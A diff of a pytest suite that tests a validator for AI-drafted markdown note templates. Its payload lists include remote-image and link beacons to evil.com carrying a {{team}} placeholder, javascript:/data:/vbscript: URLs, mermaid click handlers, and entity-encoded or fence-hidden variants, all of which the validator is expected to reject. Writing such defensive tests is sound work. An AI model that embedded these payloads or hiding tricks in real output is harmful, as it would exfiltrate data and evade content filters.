@@ -212,9 +212,9 @@ def test_html_already_flagged_is_reported_once_per_line():
     assert [d.code for d in found.problems] == ["forbidden"]
 
 
-def test_html_inside_a_code_fence_is_inert():
+def test_html_inside_a_code_fence_is_rejected_too():
     draft = GOOD.replace("## Blockers", "```\n<div>shown as text</div>\n```")
-    assert check_draft(draft).ok
+    assert "forbidden" in codes(draft)
 
 
 @pytest.mark.parametrize(
@@ -343,9 +343,10 @@ def test_remote_image_bypasses_are_rejected(image):
     [
         "A[\"<img src='https://evil.com/p.png?{{team}}'>\"]",
         "A[\"<img src=x.png>\"]",
-        "A[\"x\"] --> B[\"https://evil.com\"]",
         "A[\"//evil.com/p.png\"]",
         "click A href \"https://evil.com\"",
+        "click A \"https://evil.com/x\"",
+        "click A call evil()",
         "A[\"<a href=x>y</a>\"]",
     ],
 )
@@ -382,12 +383,12 @@ def test_system_prompt_rules_cover_html_images_urls_and_search_only():
 
 
 def test_extract_draft_strips_a_bom_and_normalises_line_endings():
-    assert extract_draft("﻿" + GOOD) == GOOD
+    assert extract_draft("\ufeff" + GOOD) == GOOD
     assert extract_draft(GOOD.replace("\n", "\r")) == GOOD
 
 
-@pytest.mark.parametrize("bad", ["﻿" + GOOD, GOOD.replace("\n", "\r\n"),
-                                 GOOD.replace("## Blockers", "## Block ers"),
+@pytest.mark.parametrize("bad", ["\ufeff" + GOOD, GOOD.replace("\n", "\r\n"),
+                                 GOOD.replace("## Blockers", "## Block\u2028ers"),
                                  GOOD.replace("## Blockers", "## Block\x00ers")])
 def test_check_draft_rejects_text_other_parsers_split_differently(bad):
     assert not check_draft(bad).ok
@@ -415,12 +416,12 @@ def test_a_second_frontmatter_block_is_rejected():
 @pytest.mark.parametrize(
     "answer",
     [
-        GOOD + "```\n",  # a stray closing fence after the file
-        GOOD.replace("status: open\n```\n", "status: open\n"),  # never closed
+        GOOD + "```\n<b>x</b>\n",  # a stray fence after the file
+        GOOD.replace("status: open\n```\n", "status: open\n<b>x</b>\n"),  # never closed
     ],
 )
-def test_stray_and_unclosed_fences_are_rejected(answer):
-    assert not check_draft(extract_draft(answer)).ok
+def test_stray_and_unclosed_fences_hide_nothing(answer):
+    assert "forbidden" in codes(extract_draft(answer))
 
 
 def test_verify_exact_accepts_the_validated_text_only():
@@ -430,7 +431,7 @@ def test_verify_exact_accepts_the_validated_text_only():
     for changed in (GOOD.replace("name: Standup", "name: Standup 2"),
                     GOOD.replace("## Blockers", "## Risks"),
                     GOOD.replace("\n", "\r\n"),
-                    "﻿" + GOOD):
+                    "\ufeff" + GOOD):
         with pytest.raises(DraftInvalid):
             verify_exact(changed, template)
 
@@ -445,3 +446,115 @@ def test_folder_and_name_answers_cannot_escape_the_vault():
     note = render(parse_template(GOOD, "t").template, {"team": "../../x/../y"}, SAMPLE_ENV)
     assert "/" not in note.filename and ".." not in note.filename
     assert note.folder == "20-contexts/sample/standups"
+
+
+# ── Fix round 2: no fence or inline-code exemptions ───────────────────────
+
+PAYLOADS = [
+    "<img src=x>",
+    "<b>hi</b>",
+    "![x](https://evil.com/p.png)",
+    "[x](https://evil.com/?q={{team}})",
+    "<https://evil.com/{{team}}>",
+    "[r]: https://evil.com/{{team}}",
+    "javascript:alert(1)",
+    "data:text/html,x",
+    "vbscript:msgbox(1)",
+    "//evil.com/p.png",
+]
+HIDING = {
+    "fence": "```\n{}\n```",
+    "mermaid": "```mermaid\ngraph TD\n{}\n```",
+    "tilde": "~~~\n{}\n~~~",
+    "unclosed": "```\n{}",
+    "space-closer": "```mermaid\ngraph TD\n    ```\n{}\n```",
+    "tab-closer": "```mermaid\ngraph TD\n\t```\n{}\n```",
+    "list-nested": "- ```\n  {}\n  ```",
+    "mismatched": "````\n```\n{}\n````",
+    "inline-code": "`{}`",
+    "comment": "<!-- {} -->",
+    "plain": "{}",
+}
+
+
+def _entities(payload: str) -> str:
+    return payload.replace("<", "&lt;").replace(":", "&#58;").replace("/", "&#47;")
+
+
+@pytest.mark.parametrize("payload", PAYLOADS)
+@pytest.mark.parametrize("hiding", sorted(HIDING))
+def test_payloads_are_found_wherever_they_hide(payload, hiding):
+    for p in (payload, _entities(payload)):
+        assert "forbidden" in codes(GOOD.replace("## Blockers", HIDING[hiding].format(p)))
+
+
+@pytest.mark.parametrize("hiding", sorted(set(HIDING) - {"comment"}))
+def test_the_hiding_places_alone_are_fine(hiding):
+    assert check_draft(GOOD.replace("## Blockers", HIDING[hiding].format("hello"))).ok
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "```mermaid\nstyle A fill:url(#104;ttps:#47;#47;evil.com/p.png)\n```",
+        "```mermaid\nA[\"#60;img src=x#62;\"]\n```",
+        "```mermaid\nA[\"<image srcset='#47;#47;evil.com/p.png'>\"]\n```",
+        "java&#9;script:alert(1)",
+    ],
+)
+def test_mermaid_entity_codes_and_css_urls_are_rejected(body):
+    assert "forbidden" in codes(GOOD.replace("## Blockers", body))
+
+
+@pytest.mark.parametrize(
+    "definition",
+    [
+        "[p\nq]: https://evil.com/p.png",
+        "[p\nq]: //evil.com/p.png",
+        "[p\nq]:\nhttps://evil.com/p.png",
+    ],
+)
+def test_multi_line_reference_labels_to_remote_urls_are_rejected(definition):
+    assert "forbidden" in codes(GOOD.replace("## Blockers", f"![p q]\n\n{definition}"))
+
+
+def test_yaml_merge_keys_are_rejected():
+    draft = GOOD.replace("  name: Standup\n", "  name: Standup\n  <<: {description: merged}\n") \
+        .replace("  description: Daily standup notes\n", "")
+    found = check_draft(draft)
+    assert not found.ok
+    assert any(d.code == "yaml" and "<<" in d.message for d in found.problems)
+
+
+@pytest.mark.parametrize("email", ["{{team}}@evil.com", "x@{{team}}.com", "a.b+c@{{team}}"])
+def test_email_autolinks_with_placeholders_are_rejected(email):
+    assert "forbidden" in codes(GOOD.replace("## Blockers", f"Mail {email} today"))
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "cc @{{team}}",
+        "<https://example.com/docs>",
+        "See https://example.com/docs and [docs](https://example.com/docs).",
+        "Intro\n\n---\n\nMore",
+        "5 < 10 and a->b, Q&A",
+        "```mermaid\nA[\"x\"] --> B[\"https://example.com\"]\n```",
+        "Click the link below.",
+    ],
+)
+def test_ordinary_text_still_passes(body):
+    assert check_draft(GOOD.replace("## Blockers", body)).ok
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "Here you go:\n\n```markdown\n" + GOOD + "```",
+        "```markdown\n" + GOOD + "```\nLet me know!",
+        "Sure.\n```md\n" + GOOD + "```\n\nAnything else?",
+    ],
+)
+def test_extract_draft_unwraps_a_fence_with_chatter_around_it(answer):
+    assert extract_draft(answer) == GOOD
+    assert check_draft(extract_draft(answer)).ok
